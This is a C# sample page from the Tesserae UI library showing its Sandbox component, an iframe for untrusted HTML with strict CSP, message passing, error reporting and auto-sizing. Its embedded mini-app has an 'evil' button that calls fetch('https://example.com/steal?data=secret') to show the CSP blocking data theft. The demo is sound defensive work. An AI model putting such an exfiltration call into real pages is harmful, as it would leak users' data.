using System.Collections.Generic;
using System.Text;
using Transpose;
using static Transpose.Core.dom;
using static Tesserae.UI;
using static Tesserae.Tests.Samples.SamplesHelper;

namespace Tesserae.Tests.Samples
{
    [SampleDetails(Group = "Utilities", Order = 31, Icon = UIcons.Shield)]
    public class SandboxSample : IComponent, ISample
    {
        private readonly IComponent _content;

        public SandboxSample()
        {
            _content = SectionStack().Secondary()
               .SampleTitle(typeof(SandboxSample), UIcons.Shield, "A locked-down iframe for rendering untrusted HTML / apps")
               .FlatSection(Overview())
               .FlatSection(SandboxedAppDemo())
               .FlatSection(FitToContentDemo())
               .FlatSection(ExternalUrlDemo())
               .FlatSection(FlagsAndCspReference())
               .FlatSection(CodeSnippet());
        }

        // A fully-sandboxed mini-app: no same-origin, strict CSP, scripts allowed. Shows the post-message
        // channel (OnMessage / PostMessage), error reporting (OnError) and a CSP violation being caught.
        private static IComponent SandboxedAppDemo()
        {
            const string appHtml =
@"<!DOCTYPE html>
<html>
<head><style>body{font-family:sans-serif;padding:12px;color:#222}button{margin-right:8px}</style></head>
<body>
  <h3>Untrusted mini-app</h3>
  <p>Running fully sandboxed (no same-origin, strict CSP).</p>
  <button id=ok>Post a message</button>
  <button id=boom>Throw an error</button>
  <button id=evil>Try to fetch() (blocked by CSP)</button>
  <script>
    document.getElementById('ok').onclick   = () => window.tssSandbox.post({ hello: 'from the sandbox', at: Date.now() });
    document.getElementById('boom').onclick  = () => { throw new Error('Boom! something went wrong inside the app'); };
    document.getElementById('evil').onclick  = () => fetch('https://example.com/steal?data=secret');
    window.addEventListener('tss:message', e => {
      const d = document.createElement('div');
      d.textContent = 'Host says: ' + JSON.stringify(e.data);
      document.body.appendChild(d);
    });
  </script>
</body>
</html>";

            var log = VStack().WS().H(160).ScrollY();

            void Append(string text, bool danger = false)
            {
                var line = TextBlock(text).XSmall().WS();
                if (danger) line.Danger();
                log.Add(line);
            }

            var sandbox = Sandbox(appHtml)
               .FitHeightToContent()
               .OnError(err => Append("⚠ " + err.ToString(), danger: true))
               .OnMessage(msg => Append("← message: " + (Script.Write<string>("JSON.stringify({0})", msg) ?? "")))
               .WS();

            var ping = Button("Send message into sandbox").SetIcon(UIcons.PaperPlane)
               .OnClick(() => sandbox.PostMessage(new Dictionary<string, object> { ["ping"] = "hi app" }));

            return Stack().WidthStretch().Children(
                Card(VStack().WS().Children(
                    TextBlock("The buttons below run inside the sandbox. \"Throw an error\" and the blocked fetch() both surface in the error log via the post-message flow. Because it is fully sandboxed the frame runs in an opaque origin and cannot reach the host page, cookies or storage, and its height is reported from inside the frame (the bootstrap needs allow-scripts)."),
                    sandbox,
                    ping,
                    SampleSubTitle("Error / message log"),
                    log)).SetTitle("Sandboxed mini-app (post-message, errors, CSP)"));
        }

        // Demonstrates FitHeightToContent for a same-origin frame whose scripts are DISABLED. The injected
        // bootstrap never runs, so the height is measured host-side - and it both grows and shrinks as the
        // content changes.
        private static IComponent FitToContentDemo()
        {
            string FitHtml(int paragraphs)
            {
                var sb = new StringBuilder();
                sb.Append("<!DOCTYPE html><html><head><style>body{font-family:sans-serif;margin:0;padding:12px;color:#222}p{padding:8px 10px;margin:6px 0;background:rgba(0,120,212,0.08);border-radius:4px}</style></head><body>");
                sb.Append("<h3>Script-free content</h3>");
                sb.Append("<p><b>Scripts are disabled</b> in this frame, so the injected bootstrap never runs. Because <code>allow-same-origin</code> is set, the host measures the document directly and still fits the frame to its content.</p>");
                for (var i = 1; i <= paragraphs; i++)
                {
                    sb.Append("<p>Paragraph ").Append(i).Append(" — the frame height tracks this content, growing and shrinking with it.</p>");
                }
                sb.Append("</body></html>");
                return sb.ToString();
            }

            var count = 2;

            var fit = Sandbox(FitHtml(count))
               .AllowSameOrigin()
               .AllowScripts(false)
               .FitHeightToContent()
               .WS();

            var more = Button("Add content").SetIcon(UIcons.Plus)
               .OnClick(() => { count++; fit.FromHtml(FitHtml(count)); });

            var less = Button("Remove content").SetIcon(UIcons.Minus)
               .OnClick(() => { count = count > 0 ? count - 1 : 0; fit.FromHtml(FitHtml(count)); });

            return Stack().WidthStretch().Children(
                Card(VStack().WS().Children(
                    TextBlock("Add or remove content and watch the frame resize to fit, even though no script runs inside it. This is the host-side measurement path, enabled whenever AllowSameOrigin is combined with FitHeightToContent."),
                    HStack().Children(more, less),
                    fit)).SetTitle("Fit height to content (host-side, no scripts)"));
        }

        // Loads an external URL via SandboxUrl. CSP / bootstrap injection do not apply to cross-origin
        // documents, so the frame keeps a fixed height and scrolls internally.
        private static IComponent ExternalUrlDemo()
        {
            var urlFrame = SandboxUrl("https://example.com")
               .AllowScripts()
               .WS()
               .H(300);

            return Stack().WidthStretch().Children(
                Card(VStack().WS().Children(
                    TextBlock("SandboxUrl loads an external page through the iframe's src attribute. The page is still sandboxed, but the injected CSP and bootstrap only apply to inline srcdoc HTML, not to cross-origin documents - so error reporting and content-height messages are unavailable here."),
                    TextBlock("Requires network access and a site that allows being framed.").XSmall().Foreground(Theme.Secondary.Foreground),
                    urlFrame)).SetTitle("Loading an external URL"));
        }

        private static IComponent FlagsAndCspReference()
        {
            const string md =
@"Sandbox is locked down by default; opt into more capability with the flag methods, and control the
network policy with the CSP methods.

```csharp
Sandbox(html)
   // sandbox attribute tokens (all default off except scripts + forms)
   .AllowScripts()          // run <script> inside the frame (on by default)
   .AllowForms()            // submit forms (on by default)
   .AllowPopups()           // window.open / target=_blank may escape the frame
   .AllowModals()           // alert / confirm / prompt
   .AllowDownloads()        // downloads initiated from the frame
   .AllowSameOrigin()       // WEAKENS isolation - only for trusted content the host must read
   .AllowToken(""allow-pointer-lock"")   // add a raw sandbox token
   .SandboxAttribute(""allow-scripts"")  // replace the computed sandbox value outright
   .Unsandboxed()           // drop the sandbox attribute entirely (use with extreme care)

   // Content-Security-Policy (only injected for srcdoc HTML, not for FromUrl)
   .ContentSecurityPolicy(""default-src 'none'; img-src data:;"")  // custom policy
   .NoContentSecurityPolicy();                                     // disable CSP injection

// The default CSP blocks all network access, so a fetch() from inside the frame is reported as a
// CSP violation through OnError (see the mini-app demo above).
```";

            return Stack().WidthStretch().Children(
                Card(VStack().WS().Children(MarkdownBlock(md))).SetTitle("Sandbox flags & Content-Security-Policy"));
        }

        private static IComponent Overview()
        {
            return Stack().WidthStretch().Children(
                Card(VStack().WS().Children(
                    TextBlock("Sandbox renders untrusted content inside an iframe that is fully sandboxed by default: loaded via srcdoc with sandbox=\"allow-scripts allow-forms\" (no allow-same-origin, so it runs in an opaque origin and cannot reach the host page, cookies or storage), and a strict Content-Security-Policy is injected as the first thing in the document so the code cannot exfiltrate data over the network."),
                    TextBlock("A bootstrap script wires up a MessageChannel: uncaught errors, unhandled rejections and CSP violations are captured inside the frame and posted back to the host via OnError. Custom host <-> sandbox messages flow through OnMessage / PostMessage."),
                    TextBlock("FitHeightToContent sizes the frame to its content (growing and shrinking). For a fully-sandboxed frame the height is reported from inside via the bootstrap (needs allow-scripts); when AllowSameOrigin is set the height is measured host-side instead, so it also works with scripts disabled."))).SetTitle("Overview"));
        }

        private static IComponent CodeSnippet()
        {
            const string md =
"```csharp\n" +
"// Untrusted content, fully sandboxed:\n" +
"var sandbox = Sandbox(untrustedHtml)\n" +
"   .FitHeightToContent()\n" +
"   .OnError(err => Console.WriteLine(err))      // errors + CSP violations\n" +
"   .OnMessage(msg => Handle(msg));             // window.tssSandbox.post(...)\n" +
"\n" +
"sandbox.PostMessage(new { ping = \"hi\" });       // -> 'tss:message' event inside the frame\n" +
"\n" +
"// Trusted content the host needs to read/measure (fits height without needing scripts):\n" +
"var trusted = Sandbox(html)\n" +
"   .AllowSameOrigin()\n" +
"   .AllowScripts(false)\n" +
"   .FitHeightToContent();\n" +
"```";

            return Stack().WidthStretch().Children(
                Card(VStack().WS().Children(MarkdownBlock(md))).SetTitle("Code"));
        }

        public HTMLElement Render() => _content.Render();
    }
}
